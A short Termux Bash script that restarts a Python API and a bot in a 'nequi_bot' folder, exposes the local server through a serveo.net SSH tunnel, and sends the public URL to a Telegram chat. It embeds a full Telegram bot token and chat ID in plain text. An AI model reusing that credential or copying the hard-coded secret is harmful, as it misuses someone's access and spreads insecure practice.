#!/data/data/com.termux/files/usr/bin/bash
echo "🔄 Matando procesos anteriores..."
pkill -f "python3 api.py" 2>/dev/null
pkill -f "python3 bot.py" 2>/dev/null
pkill -f "ssh.*serveo" 2>/dev/null
sleep 2

echo "🚀 Iniciando API..."
cd ~/nequi_bot
python3 api.py &
sleep 3

echo "🤖 Iniciando Bot..."
python3 bot.py &
sleep 2

echo "🌐 Iniciando Túnel..."
ssh -R nequivip:80:localhost:8000 serveo.net &
sleep 5

URL="https://nequivip.serveousercontent.com"
echo "✅ URL: $URL"

curl -s "https://api.telegram.org/bot8462739141:AAFhKATM8xWk-sgbDxpNyDCdT4ZDiQOxP4E/sendMessage" \
  -d "chat_id=8410759793" \
  -d "text=🌐 URL del servidor: $URL"

wait
